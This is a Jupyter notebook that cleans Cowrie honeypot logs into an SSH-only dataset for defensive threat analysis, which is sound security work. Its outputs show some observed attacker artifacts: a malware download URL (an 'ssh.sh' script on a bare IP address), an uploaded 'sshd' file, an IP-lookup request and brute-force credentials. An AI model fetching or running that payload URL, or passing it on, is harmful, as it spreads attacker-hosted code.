# Summary of SSH Honeypot Dataset Analysis

---

## What Was the Original File?
The original dataset was a raw batch of nested **JSON honeypot log files** captured via a **T-Pot / Cowrie Honeypot** environment. It contained unorganized security event records across various protocols, geolocations, and connection metadata.

---

## What Did We Extract & Produce?
From the raw logs, we cleaned, filtered, and extracted the following key information:

* **SSH Protocol Isolation:** Removed unrelated network protocols (HTTP, SIP) to isolate SSH connection sessions.
* **Brute-Force Credentials:** Extracted targeted **usernames** and **passwords** used in login attempts.
* **Attacker Commands & Payloads:** Captured executed **command inputs**, uploaded scripts, downloaded files, and their file hashes (`shasum`).
* **Threat Geolocation:** Extracted attacker IP addresses (`src_ip`) and top attacking countries (`geoip.country_name`).
* **Clean Datasets:** Generated structured and deduplicated datasets (`cowrie_ssh_clean_final.csv` / `.json`) ready for analysis.

In [ ]:
with open("RawHoneynetEventsBatch-1.json", "r", encoding="utf-8") as f:
    for i in range(5):
        print(f"Line {i+1}: {f.readline()}")

Line 1: {"_index":"logstash-2025.06.10","_id":"0hxqW5cB5GVEY-xSg8Mo","_score":null,"_ignored":["sip_message.keyword"],"_source":{"app_version":"3.0.2","transport_type":"UDP","@timestamp":"2025-06-10T19:56:35.684Z","sip_message":"INVITE sip:01113433500140@135.235.171.89 SIP/2.0\r\nVia: SIP/2.0/UDP 0.0.0.0:55249;branch=z9hG4bK98891916\r\nFrom: <sip:701@135.235.171.89>;tag=860627592\r\nTo: <sip:01113433500140@135.235.171.89>\r\nCall-ID: 670414512-651626631-891550063\r\nCSeq: 1 INVITE\r\nContact: <sip:701@0.0.0.0>\r\nContent-Type: application/sdp\r\nAllow: ACK\r\nAllow: BYE\r\nAllow: CANCEL\r\nAllow: INFO\r\nAllow: INVITE\r\nAllow: MESSAGE\r\nAllow: NOTIFY\r\nAllow: OPTIONS\r\nAllow: PRACK\r\nAllow: REFER\r\nAllow: REGISTER\r\nAllow: SUBSCRIBE\r\nAllow: UPDATE\r\nAllow: PUBLISH\r\nMax-forwards: 70\r\nUser-agent: pplsip\r\nContent-Length:   275\r\n\r\nv=0\r\no=- 329918574 329919044 IN IP4 0.0.0.0\r\ns=sipcall\r\nc=IN IP4 0.0.0.0\r\nt=0 0\r\nm=audio 7628 RTP/AVP 100 6 0 8 3 18 5 101\r\na=alt

In [ ]:
# Extract nested data from the _source column
source_df = pd.json_normalize(df["_source"])

print("Shape:", source_df.shape)

print("\nColumns:")
print(source_df.columns.tolist())

display(source_df.head())

Shape: (19728, 105)

Columns:
['@timestamp', 'timestamp', 't-pot_hostname', 'type', 'message', 'sensor', 'duration', 't-pot_ip_ext', 'src_ip', 'eventid', 'session', 'host', 'path', 't-pot_ip_int', '@version', 'geoip_ext.country_code2', 'geoip_ext.country_name', 'geoip_ext.location.lat', 'geoip_ext.location.lon', 'geoip_ext.country_code3', 'geoip_ext.longitude', 'geoip_ext.region_name', 'geoip_ext.city_name', 'geoip_ext.asn', 'geoip_ext.postal_code', 'geoip_ext.ip', 'geoip_ext.continent_code', 'geoip_ext.as_org', 'geoip_ext.region_code', 'geoip_ext.timezone', 'geoip_ext.latitude', 'geoip.country_code2', 'geoip.country_name', 'geoip.location.lat', 'geoip.location.lon', 'geoip.country_code3', 'geoip.longitude', 'geoip.asn', 'geoip.ip', 'geoip.continent_code', 'geoip.as_org', 'geoip.timezone', 'geoip.latitude', 'headers.content_length', 'headers.accept_encoding', 'headers.http_accept', 'headers.request_path', 'headers.http_version', 'headers.http_host', 'headers.content_type', 'headers.htt

,@timestamp,timestamp,t-pot_hostname,type,message,sensor,duration,t-pot_ip_ext,src_ip,eventid,...,size,ttylog,destfile,input,arch,url,id,data,height,width
0,2025-06-10T02:42:34.258Z,2025-06-10T02:42:34.258772Z,vm-centralindia,Cowrie,Connection lost after 12 seconds,7c5fd0aca56b,12.70745,135.235.171.89,190.73.89.59,cowrie.session.closed,...,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN
1,2025-06-10T02:42:33.831Z,2025-06-10T02:42:33.831670Z,vm-centralindia,Cowrie,New connection: 128.241.230.60:37530 (172.21.0...,7c5fd0aca56b,NaN,135.235.171.89,128.241.230.60,cowrie.session.connect,...,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN
2,2025-06-10T02:42:31.871Z,NaN,vm-centralindia,Sentrypeer,NaN,NaN,NaN,135.235.171.89,185.243.5.70,NaN,...,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN
3,2025-06-10T02:42:31.552Z,2025-06-10T02:42:31.552149Z,vm-centralus,Cowrie,New connection: 190.74.86.44:46704 (172.19.0.2...,9aca1bb4ae93,NaN,40.86.6.196,190.74.86.44,cowrie.session.connect,...,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN
4,2025-06-10T02:42:31.372Z,NaN,vm-spaincentral,Sentrypeer,NaN,NaN,NaN,68.221.197.138,185.243.5.70,NaN,...,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN


In [ ]:
# Count the occurrences of each Event Type
event_counts = (
    source_df["eventid"]
    .value_counts(dropna=False)
    .reset_index()
)

event_counts.columns = ["Event", "Count"]

display(event_counts)

# Display the total number of unique events
print("Number of unique events:", source_df["eventid"].nunique())

,Event,Count
0,NaN,6452
1,cowrie.session.closed,3502
2,cowrie.session.connect,3501
3,cowrie.client.version,1944
4,cowrie.login.failed,1604
5,cowrie.client.kex,1537
6,cowrie.command.input,522
7,cowrie.command.success,342
8,cowrie.command.failed,100
9,cowrie.log.closed,71


Number of unique events: 17


In [ ]:
cowrie_df = source_df[source_df["eventid"].notna()].copy()

In [ ]:
cowrie_df["eventid"].value_counts()

,count
eventid,
cowrie.session.closed,3502
cowrie.session.connect,3501
cowrie.client.version,1944
cowrie.login.failed,1604
cowrie.client.kex,1537
cowrie.command.input,522
cowrie.command.success,342
cowrie.command.failed,100
cowrie.log.closed,71


In [ ]:
cowrie_df = source_df[source_df["eventid"].notna()].copy()

print(cowrie_df.shape)

(13276, 105)


In [ ]:
cowrie_df.info()

<class 'pandas.core.frame.DataFrame'>
Index: 13276 entries, 0 to 19727
Columns: 105 entries, @timestamp to width
dtypes: float64(15), int64(2), object(88)
memory usage: 10.7+ MB


In [ ]:
# Calculate the number of missing values in each column
missing = cowrie_df.isnull().sum().sort_values(ascending=False)

missing_df = missing.reset_index()
missing_df.columns = ["Column", "Missing Values"]

# Calculate the percentage of missing values for each column
missing_df["Missing %"] = (missing_df["Missing Values"] / len(cowrie_df) * 100).round(2)

missing_df.head(50)

,Column,Missing Values,Missing %
0,event_uuid,13276,100.00
1,sip_message,13276,100.00
2,collected_method,13276,100.00
3,created_by_node_id,13276,100.00
4,sip_method,13276,100.00
5,app_name,13276,100.00
6,sip_user_agent,13276,100.00
7,transport_type,13276,100.00
8,headers.http_accept,13276,100.00
9,src_hostname,13276,100.00


In [ ]:
print(type(df))
print(df.shape)

<class 'pandas.core.frame.DataFrame'>
(19728, 8)


In [ ]:
%who

cowrie_df	 df	 dfs	 event_counts	 f	 file	 files	 final_df	 glob	 
i	 json	 json_obj	 line	 missing	 missing_df	 os	 pd	 source_df	 
valid_lines	 


In [ ]:
print(source_df.shape)
print(cowrie_df.shape)

(19728, 105)
(13276, 105)


In [ ]:
df_clean = cowrie_df.dropna(axis=1, how="all")

print("Before:", cowrie_df.shape)
print("After :", df_clean.shape)

Before: (13276, 105)
After : (13276, 88)


In [ ]:
removed_columns = set(cowrie_df.columns) - set(df_clean.columns)

print(sorted(removed_columns))

['app_name', 'app_version', 'called_number', 'collected_method', 'connection.protocol', 'connection.transport', 'connection.type', 'created_by_node_id', 'event_uuid', 'ftp.commands.arguments', 'ftp.commands.command', 'headers.http_accept', 'sip_message', 'sip_method', 'sip_user_agent', 'src_hostname', 'transport_type']


In [ ]:
cowrie_df[cowrie_df["message"].apply(lambda x: isinstance(x, list))][["eventid","message"]].head()

,eventid,message
2313,cowrie.session.params,[]
2328,cowrie.session.params,[]
2537,cowrie.session.params,[]
2559,cowrie.session.params,[]
3531,cowrie.session.params,[]


In [ ]:
import numpy as np

cowrie_df["message"] = cowrie_df["message"].apply(
    lambda x: np.nan if isinstance(x, list) else x
)

In [ ]:
cowrie_df["message"] = cowrie_df["message"].fillna("")

In [ ]:
# Display all columns with their data types

dtype_df = cowrie_df.dtypes.reset_index()
dtype_df.columns = ["Column", "Data Type"]

print(dtype_df)

             Column Data Type
0        @timestamp    object
1         timestamp    object
2    t-pot_hostname    object
3              type    object
4           message    object
..              ...       ...
100             url    object
101              id    object
102            data    object
103          height   float64
104           width   float64

[105 rows x 2 columns]


In [ ]:
dtype_df

,Column,Data Type
0,@timestamp,object
1,timestamp,object
2,t-pot_hostname,object
3,type,object
4,message,object
...,...,...
100,url,object
101,id,object
102,data,object
103,height,float64


In [ ]:
cowrie_df.dtypes.value_counts()

,count
object,88
float64,15
int64,2


In [ ]:


for col in cowrie_df.columns:
    print(col)

@timestamp
timestamp
t-pot_hostname
type
message
sensor
duration
t-pot_ip_ext
src_ip
eventid
session
host
path
t-pot_ip_int
@version
geoip_ext.country_code2
geoip_ext.country_name
geoip_ext.location.lat
geoip_ext.location.lon
geoip_ext.country_code3
geoip_ext.longitude
geoip_ext.region_name
geoip_ext.city_name
geoip_ext.asn
geoip_ext.postal_code
geoip_ext.ip
geoip_ext.continent_code
geoip_ext.as_org
geoip_ext.region_code
geoip_ext.timezone
geoip_ext.latitude
geoip.country_code2
geoip.country_name
geoip.location.lat
geoip.location.lon
geoip.country_code3
geoip.longitude
geoip.asn
geoip.ip
geoip.continent_code
geoip.as_org
geoip.timezone
geoip.latitude
headers.content_length
headers.accept_encoding
headers.http_accept
headers.request_path
headers.http_version
headers.http_host
headers.content_type
headers.http_user_agent
headers.request_method
headers.connection
src_port
dest_ip
dest_port
protocol
ip_rep
called_number
app_version
created_by_node_id
sip_method
sip_user_agent
app_name
tran

In [ ]:
summary = []

for col in cowrie_df.columns:
    try:
        unique = cowrie_df[col].nunique(dropna=True)
    except TypeError:
        unique = "List/Object"

    summary.append({
        "Column": col,
        "Missing": cowrie_df[col].isna().sum(),
        "Missing %": round(cowrie_df[col].isna().mean()*100, 2),
        "Unique Values": unique,
        "Data Type": str(cowrie_df[col].dtype)
    })

summary_df = pd.DataFrame(summary)

summary_df

,Column,Missing,Missing %,Unique Values,Data Type
0,@timestamp,0,0.00,12868,object
1,timestamp,0,0.00,13166,object
2,t-pot_hostname,0,0.00,4,object
3,type,0,0.00,1,object
4,message,0,0.00,4824,object
...,...,...,...,...,...
100,url,13270,99.95,1,object
101,id,13273,99.98,1,object
102,data,13273,99.98,1,object
103,height,13275,99.99,1,float64


In [ ]:
summary_df.sort_values("Missing %", ascending=False).reset_index(drop=True)

,Column,Missing,Missing %,Unique Values,Data Type
0,event_uuid,13276,100.0,0,object
1,sip_message,13276,100.0,0,object
2,collected_method,13276,100.0,0,object
3,created_by_node_id,13276,100.0,0,object
4,sip_method,13276,100.0,0,object
...,...,...,...,...,...
100,headers.accept_encoding,0,0.0,1,object
101,headers.connection,0,0.0,1,object
102,geoip.timezone,0,0.0,58,object
103,headers.content_length,0,0.0,2970,object


In [ ]:
event_summary = {}

for event in cowrie_df["eventid"].dropna().unique():

    temp = cowrie_df[cowrie_df["eventid"] == event]

    event_summary[event] = temp.notna().sum()

event_summary_df = pd.DataFrame(event_summary)

event_summary_df

,cowrie.session.closed,cowrie.session.connect,cowrie.client.kex,cowrie.client.version,cowrie.login.failed,cowrie.session.file_upload,cowrie.login.success,cowrie.log.closed,cowrie.session.file_download,cowrie.command.input,cowrie.command.failed,cowrie.command.success,cowrie.session.params,cowrie.session.file_download.failed,cowrie.direct-tcpip.data,cowrie.direct-tcpip.request,cowrie.client.size
@timestamp,3502,3501,1537,1944,1604,4,55,71,13,522,100,342,71,3,3,3,1
timestamp,3502,3501,1537,1944,1604,4,55,71,13,522,100,342,71,3,3,3,1
t-pot_hostname,3502,3501,1537,1944,1604,4,55,71,13,522,100,342,71,3,3,3,1
type,3502,3501,1537,1944,1604,4,55,71,13,522,100,342,71,3,3,3,1
message,3502,3501,1537,1944,1604,4,55,71,13,522,100,342,71,3,3,3,1
...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...
url,0,0,0,0,0,0,0,0,3,0,0,0,0,3,0,0,0
id,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,0,0
data,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,0,0
height,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1


In [ ]:
# ===============================
# Data Type Conversion
# ===============================

# Convert timestamps
cowrie_df["@timestamp"] = pd.to_datetime(cowrie_df["@timestamp"], errors="coerce")
cowrie_df["timestamp"] = pd.to_datetime(cowrie_df["timestamp"], errors="coerce")

# Convert numeric columns
numeric_cols = [
    "duration",
    "src_port",
    "dest_port",
    "geoip.latitude",
    "geoip.longitude",
    "geoip.location.lat",
    "geoip.location.lon",
    "geoip_ext.latitude",
    "geoip_ext.longitude",
    "geoip_ext.location.lat",
    "geoip_ext.location.lon",
    "geoip.asn",
    "geoip_ext.asn"
]

for col in numeric_cols:
    if col in cowrie_df.columns:
        cowrie_df[col] = pd.to_numeric(cowrie_df[col], errors="coerce")

print("✅ Data Types Converted Successfully")

✅ Data Types Converted Successfully


In [ ]:
cowrie_df[
    ["@timestamp","timestamp","duration","src_port","dest_port"]
].dtypes

,0
@timestamp,"datetime64[ns, UTC]"
timestamp,"datetime64[ns, UTC]"
duration,float64
src_port,float64
dest_port,float64


In [ ]:
constant_columns = []

for col in cowrie_df.columns:
    try:
        if cowrie_df[col].nunique(dropna=True) == 1:
            constant_columns.append(col)
    except:
        pass

print("Number of Constant Columns:", len(constant_columns))
print()

for col in constant_columns:
    print(col)

Number of Constant Columns: 21

type
host
path
@version
geoip_ext.asn
geoip_ext.as_org
headers.accept_encoding
headers.request_path
headers.http_version
headers.http_host
headers.content_type
headers.http_user_agent
headers.request_method
headers.connection
geoip_ext.dma_code
filename
url
id
data
height
width


In [ ]:
print("Unique Sessions:", cowrie_df["session"].nunique())

print("Missing Sessions:", cowrie_df["session"].isna().sum())

Unique Sessions: 3480
Missing Sessions: 0


In [ ]:
session_events = (
    cowrie_df
    .groupby("session")["eventid"]
    .apply(list)
)

session_events.head(10)

,eventid
session,
00173edc1cb6,"[cowrie.session.closed, cowrie.login.failed, c..."
002c033b3171,"[cowrie.session.closed, cowrie.login.failed, c..."
0031c1fc64db,"[cowrie.session.closed, cowrie.login.failed, c..."
0032ab85bf2b,"[cowrie.session.closed, cowrie.session.connect]"
00442034db4d,"[cowrie.session.closed, cowrie.session.connect]"
0079a18db8cc,"[cowrie.session.closed, cowrie.client.version,..."
007a4fefa29c,"[cowrie.session.closed, cowrie.session.connect]"
0081c3d51d31,"[cowrie.session.closed, cowrie.login.failed, c..."
008582491482,"[cowrie.session.closed, cowrie.session.connect]"


In [ ]:
cowrie_df = cowrie_df.sort_values("@timestamp").reset_index(drop=True)

In [ ]:
session_events = (
    cowrie_df
    .groupby("session")["eventid"]
    .apply(list)
)

session_events.head(10)

,eventid
session,
00173edc1cb6,"[cowrie.session.connect, cowrie.client.version..."
002c033b3171,"[cowrie.session.connect, cowrie.client.version..."
0031c1fc64db,"[cowrie.session.connect, cowrie.client.version..."
0032ab85bf2b,"[cowrie.session.connect, cowrie.session.closed]"
00442034db4d,"[cowrie.session.connect, cowrie.session.closed]"
0079a18db8cc,"[cowrie.session.connect, cowrie.client.version..."
007a4fefa29c,"[cowrie.session.connect, cowrie.session.closed]"
0081c3d51d31,"[cowrie.session.connect, cowrie.client.version..."
008582491482,"[cowrie.session.connect, cowrie.session.closed]"


In [ ]:
# Columns that contain at least one non-null value

useful_columns = cowrie_df.columns[cowrie_df.notna().any()]

print("Number of Useful Columns:", len(useful_columns))

for col in useful_columns:
    print(col)

Number of Useful Columns: 88
@timestamp
timestamp
t-pot_hostname
type
message
sensor
duration
t-pot_ip_ext
src_ip
eventid
session
host
path
t-pot_ip_int
@version
geoip_ext.country_code2
geoip_ext.country_name
geoip_ext.location.lat
geoip_ext.location.lon
geoip_ext.country_code3
geoip_ext.longitude
geoip_ext.region_name
geoip_ext.city_name
geoip_ext.asn
geoip_ext.postal_code
geoip_ext.ip
geoip_ext.continent_code
geoip_ext.as_org
geoip_ext.region_code
geoip_ext.timezone
geoip_ext.latitude
geoip.country_code2
geoip.country_name
geoip.location.lat
geoip.location.lon
geoip.country_code3
geoip.longitude
geoip.asn
geoip.ip
geoip.continent_code
geoip.as_org
geoip.timezone
geoip.latitude
headers.content_length
headers.accept_encoding
headers.request_path
headers.http_version
headers.http_host
headers.content_type
headers.http_user_agent
headers.request_method
headers.connection
src_port
dest_ip
dest_port
protocol
ip_rep
geoip_ext.dma_code
geoip.region_name
geoip.city_name
geoip.region_code
user

In [ ]:
audit = pd.DataFrame({
    "Column": cowrie_df.columns,
    "Missing %": (cowrie_df.isna().mean()*100).round(2),
    "Data Type": cowrie_df.dtypes.astype(str)
})

audit = audit.sort_values("Missing %")

audit

,Column,Missing %,Data Type
@timestamp,@timestamp,0.0,"datetime64[ns, UTC]"
timestamp,timestamp,0.0,"datetime64[ns, UTC]"
t-pot_hostname,t-pot_hostname,0.0,object
type,type,0.0,object
message,message,0.0,object
...,...,...,...
connection.transport,connection.transport,100.0,object
src_hostname,src_hostname,100.0,object
connection.protocol,connection.protocol,100.0,object
connection.type,connection.type,100.0,object


In [ ]:
cols = [
    "headers.request_method",
    "headers.content_type",
    "headers.request_path",
    "headers.http_version",
    "headers.http_user_agent",
    "headers.connection",
    "headers.http_host",
    "headers.accept_encoding"
]

cowrie_df[cols].notna().sum()

,0
headers.request_method,13276
headers.content_type,13276
headers.request_path,13276
headers.http_version,13276
headers.http_user_agent,13276
headers.connection,13276
headers.http_host,13276
headers.accept_encoding,13276


In [ ]:
cols = [
    "height",
    "width",
    "id",
    "url",
    "filename",
    "data"
]

cowrie_df[cols].notna().sum()

,0
height,1
width,1
id,3
url,6
filename,4
data,3


In [ ]:
for col in cols:
    print("\n", col)
    print(cowrie_df[col].value_counts(dropna=False).head())


 height
height
NaN     13275
24.0        1
Name: count, dtype: int64

 width
width
NaN     13275
80.0        1
Name: count, dtype: int64

 id
id
NaN    13273
0          3
Name: count, dtype: int64

 url
url
NaN                             13270
http://213.209.143.44/ssh.sh        6
Name: count, dtype: int64

 filename
filename
NaN     13272
sshd        4
Name: count, dtype: int64

 data
data
NaN                                                   13273
b'GET /json/ HTTP/1.1\r\nHost: ip-who.com\r\n\r\n'        3
Name: count, dtype: int64


In [ ]:
columns_to_drop = [
    "@version",
    "headers.request_method",
    "headers.content_type",
    "headers.request_path",
    "headers.http_version",
    "headers.http_user_agent",
    "headers.connection",
    "headers.http_host",
    "headers.accept_encoding",

    "app_name",
    "app_version",
    "sip_method",
    "sip_message",
    "sip_user_agent",

    "ftp.commands.command",
    "ftp.commands.arguments",

    "connection.protocol",
    "connection.transport",
    "connection.type",

    "created_by_node_id",
    "event_uuid",
    "called_number",
    "src_hostname",
    "transport_type",
    "collected_method"
]

cowrie_clean = cowrie_df.drop(columns=columns_to_drop, errors="ignore")

print("Shape Before :", cowrie_df.shape)
print("Shape After  :", cowrie_clean.shape)

Shape Before : (13276, 105)
Shape After  : (13276, 80)


In [ ]:
constant_cols = []

for col in cowrie_clean.columns:
    try:
        if cowrie_clean[col].nunique(dropna=True) == 1:
            constant_cols.append(col)
    except TypeError:
        print(f"Skipped (List/Dict): {col}")

print("\nConstant Columns:")
print(constant_cols)

Skipped (List/Dict): encCS
Skipped (List/Dict): kexAlgs
Skipped (List/Dict): macCS
Skipped (List/Dict): keyAlgs
Skipped (List/Dict): compCS
Skipped (List/Dict): langCS

Constant Columns:
['type', 'host', 'path', 'geoip_ext.asn', 'geoip_ext.as_org', 'geoip_ext.dma_code', 'filename', 'url', 'id', 'data', 'height', 'width']


In [ ]:
extra_drop = [
    "path",
    "type",
    "geoip_ext.dma_code"
]

cowrie_clean = cowrie_clean.drop(columns=extra_drop, errors="ignore")

print(cowrie_clean.shape)

(13276, 77)


In [ ]:
session_stats = cowrie_clean.groupby("session").size()

print(session_stats.describe())

count    3480.000000
mean        3.814943
std         4.738364
min         1.000000
25%         2.000000
50%         3.000000
75%         5.000000
max       167.000000
dtype: float64


In [ ]:
single_event_sessions = session_stats[session_stats == 1]

print("Sessions with only one event:", len(single_event_sessions))

Sessions with only one event: 20


In [ ]:
event_per_session = cowrie_clean.groupby("session")["eventid"].nunique()

print(event_per_session.describe())

count    3480.000000
mean        3.506322
std         1.526791
min         1.000000
25%         2.000000
50%         3.000000
75%         5.000000
max        11.000000
Name: eventid, dtype: float64


In [ ]:
sample_session = cowrie_clean["session"].sample(1, random_state=42).iloc[0]

cowrie_clean[
    cowrie_clean["session"] == sample_session
][
    ["@timestamp","eventid","message"]
].sort_values("@timestamp")

,@timestamp,eventid,message
6948,2025-06-10 00:06:34.193000+00:00,cowrie.session.connect,New connection: 196.251.84.225:47054 (172.20.0...
6949,2025-06-10 00:06:34.215000+00:00,cowrie.client.version,Remote SSH version: SSH-2.0-Go
6950,2025-06-10 00:06:34.365000+00:00,cowrie.client.kex,SSH client hassh fingerprint: 5f904648ee8964be...
6951,2025-06-10 00:06:35.072000+00:00,cowrie.login.failed,login attempt [gerbera/gerbera] failed
6952,2025-06-10 00:06:36.265000+00:00,cowrie.session.closed,Connection lost after 2.1 seconds


In [ ]:
cowrie_clean.to_csv(
    "cowrie_clean_v1.csv",
    index=False
)

cowrie_clean.to_json(
    "cowrie_clean_v1.json",
    orient="records",
    lines=True
)

print("Dataset Saved Successfully!")

Dataset Saved Successfully!


In [ ]:
cowrie_clean["protocol"].value_counts(dropna=False)

,count
protocol,
NaN,9775
ssh,1990
telnet,1511


In [ ]:

important_cols = [
    "username",
    "password",
    "input",
    "hassh",
    "version",
    "protocol",
    "src_ip",
    "dest_port"
]


for col in important_cols:
    print("=" * 70)
    print(f"\nColumn: {col}\n")

    print(
        cowrie_clean.groupby("eventid")[col]
        .apply(lambda x: round(x.isna().mean() * 100, 2))
        .sort_index()
    )


Column: username

eventid
cowrie.client.kex                      100.0
cowrie.client.size                     100.0
cowrie.client.version                  100.0
cowrie.command.failed                  100.0
cowrie.command.input                   100.0
cowrie.command.success                 100.0
cowrie.direct-tcpip.data               100.0
cowrie.direct-tcpip.request            100.0
cowrie.log.closed                      100.0
cowrie.login.failed                      0.0
cowrie.login.success                     0.0
cowrie.session.closed                  100.0
cowrie.session.connect                 100.0
cowrie.session.file_download           100.0
cowrie.session.file_download.failed    100.0
cowrie.session.file_upload             100.0
cowrie.session.params                  100.0
Name: username, dtype: float64

Column: password

eventid
cowrie.client.kex                      100.0
cowrie.client.size                     100.0
cowrie.client.version                  100.0
cowrie.command.

In [ ]:
import ipaddress

invalid_ips = []

for ip in cowrie_clean["src_ip"].dropna():
    try:
        ipaddress.ip_address(ip)
    except:
        invalid_ips.append(ip)

print("Invalid IPs:", len(invalid_ips))

if len(invalid_ips) > 0:
    print(invalid_ips[:20])

Invalid IPs: 0


In [ ]:
cowrie_clean["protocol"].value_counts(dropna=False)

,count
protocol,
NaN,9775
ssh,1990
telnet,1511


In [ ]:
ssh_sessions = cowrie_clean.loc[
    cowrie_clean["protocol"] == "ssh",
    "session"
].unique()

print("SSH Sessions:", len(ssh_sessions))

SSH Sessions: 1973


In [ ]:
cowrie_ssh = cowrie_clean[
    cowrie_clean["session"].isin(ssh_sessions)
].copy()

print("Shape:", cowrie_ssh.shape)
print(cowrie_ssh["eventid"].value_counts())

Shape: (9160, 77)
eventid
cowrie.session.closed                  1991
cowrie.session.connect                 1990
cowrie.client.version                  1944
cowrie.client.kex                      1537
cowrie.login.failed                    1511
cowrie.command.input                     50
cowrie.session.params                    43
cowrie.log.closed                        43
cowrie.login.success                     27
cowrie.session.file_download              6
cowrie.command.failed                     4
cowrie.session.file_upload                4
cowrie.direct-tcpip.request               3
cowrie.session.file_download.failed       3
cowrie.direct-tcpip.data                  3
cowrie.client.size                        1
Name: count, dtype: int64


In [ ]:
cowrie_ssh["protocol"].value_counts(dropna=False)

,count
protocol,
NaN,7170
ssh,1990


In [ ]:
cowrie_ssh["protocol"] = (
    cowrie_ssh
    .groupby("session")["protocol"]
    .transform("ffill")
    .transform("bfill")
)

cowrie_ssh["protocol"].value_counts(dropna=False)

,count
protocol,
ssh,9160


In [ ]:
print(cowrie_ssh["protocol"].unique())

['ssh']


In [ ]:
session_events = cowrie_ssh.groupby("session")["eventid"].agg(list)

missing_connect = 0
missing_closed = 0

for events in session_events:
    if "cowrie.session.connect" not in events:
        missing_connect += 1
    if "cowrie.session.closed" not in events:
        missing_closed += 1

print("Sessions without Connect:", missing_connect)
print("Sessions without Closed :", missing_closed)

Sessions without Connect: 0
Sessions without Closed : 0


In [ ]:
print("Unique Sessions :", cowrie_ssh["session"].nunique())
print("Total Records   :", len(cowrie_ssh))

Unique Sessions : 1973
Total Records   : 9160


In [ ]:
cowrie_ssh["eventid"].value_counts()

,count
eventid,
cowrie.session.closed,1991
cowrie.session.connect,1990
cowrie.client.version,1944
cowrie.client.kex,1537
cowrie.login.failed,1511
cowrie.command.input,50
cowrie.session.params,43
cowrie.log.closed,43
cowrie.login.success,27


In [ ]:
print(cowrie_ssh["session"].isna().sum())

0


In [ ]:
key_columns = [
    "@timestamp",
    "eventid",
    "session",
    "src_ip",
    "message"
]

duplicates = cowrie_ssh.duplicated(subset=key_columns).sum()

print("Duplicate Rows:", duplicates)

Duplicate Rows: 81


In [ ]:
cowrie_ssh[
    cowrie_ssh.duplicated(subset=key_columns, keep=False)
].sort_values(["session", "@timestamp"])

,@timestamp,timestamp,t-pot_hostname,message,sensor,duration,t-pot_ip_ext,src_ip,eventid,session,...,size,ttylog,destfile,input,arch,url,id,data,height,width
885,2025-06-09 20:00:22.110000+00:00,2025-06-09 20:00:22.110600+00:00,vm-spaincentral,Connection lost after 5.7 seconds,350079b36217,5.7,68.221.197.138,176.65.148.10,cowrie.session.closed,06786de80d2b,...,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN
886,2025-06-09 20:00:22.110000+00:00,2025-06-09 20:00:22.110600+00:00,vm-spaincentral,Connection lost after 5.7 seconds,350079b36217,5.7,68.221.197.138,176.65.148.10,cowrie.session.closed,06786de80d2b,...,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN
5381,2025-06-09 23:08:06.122000+00:00,2025-06-09 23:08:06.122384+00:00,vm-southafricanorth,Connection lost after 1.9 seconds,2eb14be7b7ab,1.9,20.87.74.66,196.251.84.225,cowrie.session.closed,0b2b73a267d6,...,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN
5382,2025-06-09 23:08:06.122000+00:00,2025-06-09 23:08:06.122384+00:00,vm-southafricanorth,Connection lost after 1.9 seconds,2eb14be7b7ab,1.9,20.87.74.66,196.251.84.225,cowrie.session.closed,0b2b73a267d6,...,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN
4393,2025-06-09 22:38:15.753000+00:00,2025-06-09 22:38:15.753548+00:00,vm-spaincentral,New connection: 173.231.185.164:54204 (172.18....,350079b36217,NaN,68.221.197.138,173.231.185.164,cowrie.session.connect,1660e70116c1,...,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN
...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...,...
1765,2025-06-09 20:44:33.793000+00:00,2025-06-09 20:44:33.793049+00:00,vm-southafricanorth,New connection: 196.251.84.225:44516 (172.20.0...,2eb14be7b7ab,NaN,20.87.74.66,196.251.84.225,cowrie.session.connect,fca75a9db11a,...,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN
1766,2025-06-09 20:44:33.797000+00:00,2025-06-09 20:44:33.797312+00:00,vm-southafricanorth,Remote SSH version: SSH-2.0-Go,2eb14be7b7ab,NaN,20.87.74.66,196.251.84.225,cowrie.client.version,fca75a9db11a,...,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN
1767,2025-06-09 20:44:33.797000+00:00,2025-06-09 20:44:33.797312+00:00,vm-southafricanorth,Remote SSH version: SSH-2.0-Go,2eb14be7b7ab,NaN,20.87.74.66,196.251.84.225,cowrie.client.version,fca75a9db11a,...,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN
1768,2025-06-09 20:44:33.986000+00:00,2025-06-09 20:44:33.986292+00:00,vm-southafricanorth,SSH client hassh fingerprint: 5f904648ee8964be...,2eb14be7b7ab,NaN,20.87.74.66,196.251.84.225,cowrie.client.kex,fca75a9db11a,...,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN


In [ ]:
key_columns = [
    "@timestamp",
    "eventid",
    "session",
    "src_ip",
    "message"
]

cowrie_ssh = cowrie_ssh.drop_duplicates(
    subset=key_columns,
    keep="first"
).reset_index(drop=True)

print(cowrie_ssh.shape)

(9079, 77)


In [ ]:
duplicates = cowrie_ssh.duplicated(subset=key_columns).sum()
print("Duplicate Rows:", duplicates)

Duplicate Rows: 0


In [ ]:
cowrie_ssh["session"].duplicated().sum()

np.int64(7106)

In [ ]:
cowrie_ssh["@timestamp"].is_monotonic_increasing

True

In [ ]:
cowrie_ssh = cowrie_ssh.sort_values("@timestamp")

In [ ]:
cowrie_ssh.head()
cowrie_ssh.tail()

,@timestamp,timestamp,t-pot_hostname,message,sensor,duration,t-pot_ip_ext,src_ip,eventid,session,...,size,ttylog,destfile,input,arch,url,id,data,height,width
